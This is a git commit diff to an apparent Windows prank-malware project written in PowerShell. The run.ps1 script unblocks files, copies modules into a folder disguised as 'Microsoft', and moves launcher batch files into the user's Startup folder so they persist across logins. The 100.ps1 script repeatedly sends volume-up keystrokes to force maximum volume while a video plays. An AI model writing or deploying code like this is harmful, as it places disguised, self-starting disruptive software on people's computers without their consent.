defae7e0a9cc2da1a2ded858dd700b55a0ced4da
Shaymin-HEG-001 <194256797+Shaymin-HEG-001@users.noreply.github.com>
2025-04-08 12:52:41 +0200

    Improve Video

--- Microsoft/module-2/100.ps1
+++ Microsoft/module-2/100.ps1
@@ -1,23 +1,3 @@
-Function Set-SoundVolume 
-{
-    Param(
-        [Parameter(Mandatory=$true)]
-        [ValidateRange(0,100)]
-        [Int]
-        $volume
-    )
-
-    $keyPresses = [Math]::Ceiling( $volume / 2 )
-    
-    $obj = New-Object -ComObject WScript.Shell
-    
-    1..50 | ForEach-Object {  $obj.SendKeys( [char] 174 )  }
-    
-    for( $i = 0; $i -lt $keyPresses; $i++ )
-    {
-        $obj.SendKeys( [char] 175 )
-    }
-}
-New-Alias -Name "ssv" Set-SoundVolume
-
-Set-SoundVolume 100
+$obj = New-Object -ComObject WScript.Shell
+1..50 | ForEach-Object {$obj.SendKeys([char] 175)}
+1..300 | ForEach-Object {$obj.SendKeys([char] 175);Start-Sleep -Milliseconds 100}
--- run.ps1
+++ run.ps1
@@ -2,6 +2,7 @@
 $location = Get-Location
 $sourcePath = "${location}\Microsoft"
 $destinationPath = "C:\Users\$env:USERNAME\documents\Microsoft"
+$video = 2
 
 # Unblock Files
 dir -r | unblock-file
@@ -9,12 +10,13 @@ dir -r | unblock-file
 # Copy to System
 xcopy "${sourcePath}\module-1\" "${destinationPath}\module-1" /S /H /I
 xcopy "${sourcePath}\module-2\" "${destinationPath}\module-2" /S /H /I
+copy-item "${location}\extra\vid${video}.mkv" "${destinationPath}\module-2\video.mkv" -Force
 
 Move-Item "${destinationPath}\module-2\module-2-START-AUTO.bat" "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Force
 Move-Item "${destinationPath}\module-2\clear.bat" "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Force
 
 # Start Modules
-Start-Process ".\microsoft\module-3\module-3-START.bat"
+Start-Process "${sourcePath}\module-3\module-3-START.bat"
 Start-Process "${destinationPath}\module-2\module-2-START.bat"
 Start-Sleep 4
 Start-Process "${destinationPath}\module-1\module-1-START.bat"
